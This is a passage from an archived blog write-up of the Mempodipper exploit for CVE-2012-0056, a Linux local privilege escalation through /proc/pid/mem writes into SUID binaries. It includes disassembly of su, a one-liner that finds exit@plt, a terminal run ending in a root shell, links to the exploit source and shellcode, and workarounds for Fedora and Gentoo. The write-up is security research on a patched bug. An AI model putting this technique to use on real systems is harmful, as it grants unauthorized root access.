<span class="w">  </span><span class="mi">403683</span><span class="err">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="n">e0</span><span class="w"> </span><span class="n">ed</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">callq</span><span class="w">  </span><span class="mi">402468</span><span class="w"> </span><span class="p">(</span><span class="n">dcgettext</span><span class="nv">@plt</span><span class="p">)</span><span class="w"></span>
</code></pre></div>

<p>And then writes it to stderr:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="mi">403688</span><span class="err">:</span><span class="w">       </span><span class="mi">48</span><span class="w"> </span><span class="mi">8</span><span class="n">b</span><span class="w"> </span><span class="mi">3</span><span class="n">d</span><span class="w"> </span><span class="mi">59</span><span class="w"> </span><span class="mi">51</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">00</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="mh">0x205159</span><span class="p">(</span><span class="o">%</span><span class="n">rip</span><span class="p">),</span><span class="o">%</span><span class="n">rdi</span><span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="mf">6087e8</span><span class="w"> </span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="mi">40368</span><span class="nl">f</span><span class="p">:</span><span class="w">       </span><span class="mi">48</span><span class="w"> </span><span class="mi">89</span><span class="w"> </span><span class="n">c2</span><span class="w">                </span><span class="n">mov</span><span class="w">    </span><span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rdx</span><span class="w"></span>
<span class="w">  </span><span class="mi">403692</span><span class="err">:</span><span class="w">       </span><span class="n">b9</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">88</span><span class="w"> </span><span class="mi">60</span><span class="w"> </span><span class="mi">00</span><span class="w">          </span><span class="n">mov</span><span class="w">    </span><span class="err">$</span><span class="mh">0x608820</span><span class="p">,</span><span class="o">%</span><span class="n">ecx</span><span class="w"></span>
<span class="w">  </span><span class="mi">403697</span><span class="err">:</span><span class="w">       </span><span class="n">be</span><span class="w"> </span><span class="mi">01</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w">          </span><span class="n">mov</span><span class="w">    </span><span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">esi</span><span class="w"></span>
<span class="w">  </span><span class="mi">40369</span><span class="nl">c</span><span class="p">:</span><span class="w">       </span><span class="mi">31</span><span class="w"> </span><span class="n">c0</span><span class="w">                   </span><span class="n">xor</span><span class="w">    </span><span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span><span class="w"></span>
<span class="w">  </span><span class="mi">40369</span><span class="nl">e</span><span class="p">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="mi">75</span><span class="w"> </span><span class="n">ea</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">callq</span><span class="w">  </span><span class="mi">402118</span><span class="w"> </span><span class="p">(</span><span class="n">__fprintf_chk</span><span class="nv">@plt</span><span class="p">)</span><span class="w"></span>
</code></pre></div>

<p>Closes the log:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="mi">4036</span><span class="nl">a3</span><span class="p">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="n">f0</span><span class="w"> </span><span class="n">eb</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">callq</span><span class="w">  </span><span class="mi">402298</span><span class="w"> </span><span class="p">(</span><span class="n">closelog</span><span class="nv">@plt</span><span class="p">)</span><span class="w"></span>
</code></pre></div>

<p>And then exits the program:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="mi">4036</span><span class="nl">a8</span><span class="p">:</span><span class="w">       </span><span class="n">bf</span><span class="w"> </span><span class="mi">01</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w"> </span><span class="mi">00</span><span class="w">          </span><span class="n">mov</span><span class="w">    </span><span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">edi</span><span class="w"></span>
<span class="w">  </span><span class="mi">4036</span><span class="nl">ad</span><span class="p">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="n">c6</span><span class="w"> </span><span class="n">ea</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">callq</span><span class="w">  </span><span class="mi">402178</span><span class="w"> </span><span class="p">(</span><span class="k">exit</span><span class="nv">@plt</span><span class="p">)</span><span class="w"></span>
</code></pre></div>

<p>We therefore want to use <code>0x402178</code>, which is the exit function it calls. We can, in an exploit, automate the finding of the <tt>exit@plt</tt> symbol with a simple bash one-liner:</p>
<div class="highlight"><pre><span></span><code>$ objdump -d /bin/su<span class="p">|</span>grep <span class="s1">'&lt;exit@plt&gt;'</span><span class="p">|</span>head -n <span class="m">1</span><span class="p">|</span>cut -d <span class="s1">' '</span> -f <span class="m">1</span><span class="p">|</span>sed <span class="s1">'s/^[0]*\([^0]*\)/0x\1/'</span>
0x402178
</code></pre></div>

<p>So naturally, we want to write to <code>0x402178</code> minus the number of letters in the string "Unknown id: ", so that our shellcode is placed at exactly the right place.</p>
<p>The shellcode should be simple and standard. It sets the uid and gid to 0 and <tt>exec</tt>s into a shell. If we want to be clever, we can reopen stderr by, prior to <tt>dup2</tt>ing the memory fd to stderr, we choose another fd to dup stderr to, and then in the shellcode, we <tt>dup2</tt> that other fd <i>back</i> to stderr.</p>
<p>In the end, the exploit works like a charm with total reliability:</p>
<div class="highlight"><pre><span></span><code><span class="n">CVE</span><span class="o">-</span><span class="mi">2012</span><span class="o">-</span><span class="mi">0056</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>
<span class="n">build</span><span class="o">-</span><span class="ow">and</span><span class="o">-</span><span class="n">run</span><span class="o">-</span><span class="n">exploit</span><span class="p">.</span><span class="n">sh</span><span class="w">  </span><span class="n">build</span><span class="o">-</span><span class="ow">and</span><span class="o">-</span><span class="n">run</span><span class="o">-</span><span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span><span class="w">  </span><span class="n">mempodipper</span><span class="p">.</span><span class="n">c</span><span class="w">  </span><span class="n">shellcode</span><span class="o">-</span><span class="mf">32.</span><span class="n">s</span><span class="w">  </span><span class="n">shellcode</span><span class="o">-</span><span class="mf">64.</span><span class="n">s</span><span class="w"></span>
<span class="n">CVE</span><span class="o">-</span><span class="mi">2012</span><span class="o">-</span><span class="mi">0056</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="n">mempodipper</span><span class="p">.</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">mempodipper</span><span class="w"></span>
<span class="n">CVE</span><span class="o">-</span><span class="mi">2012</span><span class="o">-</span><span class="mi">0056</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">mempodipper</span><span class="w"> </span>
<span class="o">===============================</span><span class="w"></span>
<span class="o">=</span><span class="w">          </span><span class="n">Mempodipper</span><span class="w">        </span><span class="o">=</span><span class="w"></span>
<span class="o">=</span><span class="w">           </span><span class="k">by</span><span class="w"> </span><span class="n">zx2c4</span><span class="w">          </span><span class="o">=</span><span class="w"></span>
<span class="o">=</span><span class="w">         </span><span class="n">Jan</span><span class="w"> </span><span class="mi">21</span><span class="p">,</span><span class="w"> </span><span class="mi">2012</span><span class="w">        </span><span class="o">=</span><span class="w"></span>
<span class="o">===============================</span><span class="w"></span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Waiting</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">transferred</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">parent</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Executing</span><span class="w"> </span><span class="n">child</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">child</span><span class="w"> </span><span class="n">fork</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Opening</span><span class="w"> </span><span class="n">parent</span><span class="w"> </span><span class="n">mem</span><span class="w"> </span><span class="o">/</span><span class="k">proc</span><span class="o">/</span><span class="mi">6454</span><span class="o">/</span><span class="n">mem</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">child</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">parent</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Received</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mf">5.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Assigning</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">stderr</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Reading</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">exit</span><span class="nv">@plt</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Resolved</span><span class="w"> </span><span class="k">exit</span><span class="nv">@plt</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mh">0x402178</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Seeking</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="mh">0x40216c</span><span class="p">.</span><span class="w"></span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Executing</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">shellcode</span><span class="p">.</span><span class="w"></span>
<span class="n">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="err">#</span><span class="w"> </span><span class="n">whoami</span><span class="w"></span>
<span class="n">root</span><span class="w"></span>
<span class="n">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="err">#</span><span class="w"></span>
</code></pre></div>

<p>You can watch a <a href="http://youtu.be/yLu4q4gMCCA">video</a> of it in action.</p>
<p>Thanks to <a href="http://vulnfactory.org/">Dan Rosenberg</a> for his continued advice and support. <s>I'm currently not releasing any source code</s>, as Linus only <a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=e268337dfe26dfc7efd422a804dbb27977a3cccc">very recently</a> patched it. <s>After a responsible amount of time passes or if someone else does first, I'll publish. If you're a student trying to learn about things or have otherwise legitimate reasons, we can talk.</s></p>
<p><b>Update</b>: evidently, based on this blog post, ironically, some other folks made exploits and published them. So, <a href="http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c">here's mine</a>. I wrote the shellcode for <a href="http://git.zx2c4.com/CVE-2012-0056/tree/shellcode-32.s">32-bit</a> and <a href="http://git.zx2c4.com/CVE-2012-0056/tree/shellcode-64.s">64-bit</a> by hand. Enjoy!</p>
<p><b>Update 2</b>: as it turns out, Fedora very aptly compiles their <tt>su</tt> with <tt>PIE</tt>, which defeats this attack. They do not, unfortunately, compile all their SUID binaries with <tt>PIE</tt>, and so this attack is still possible with, for example, <tt>gpasswd</tt>. The <a href="http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c?h=fedora">code to do this</a> is in the "fedora" branch of the git repository, and a <a href="http://www.youtube.com/watch?v=OKnth3R9nI4">video demonstration is also available</a>.</p>
<p><b>Update 3</b>: Gentoo is smart enough to remove read permissions on SUID binaries, making it impossible to find the <tt>exit@plt</tt> offset using <tt>objdump</tt>. I determined another way to do this, using ptrace. <tt>Ptrace</tt> allows debugging of any program in memory. For SUID programs, ptracing will drop its privileges, but that's fine, since we simply want to find internal memory locations. By parsing the opcode of the binary at the right time, we can decipher the target address of the next call after the printing of the error message. I've created a <a href="http://git.zx2c4.com/CVE-2012-0056/tree/ptrace-offset-finder.c">standalone utility</a> that returns the offset, as well as integrating it into the <a href="http://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c">main mempodipper source</a>.</p>
<p><i>{As always, this is work here is strictly academic, and is not intended for use beyond research and education.}</i></p></div></div></div> <!-- class=content -->
<div class="footer">Copyright © 1996 – 2021 Jason A. Donenfeld. All Rights Reverse Engineered.</div>
<script type="text/javascript" async="" src="./2012 - Linux Local Privilege Escalation via SUID _proc_pid_mem Write_files/ga.js.下載"></script><script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-135234-5']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
</div> <!-- id=cgit -->


</body></html>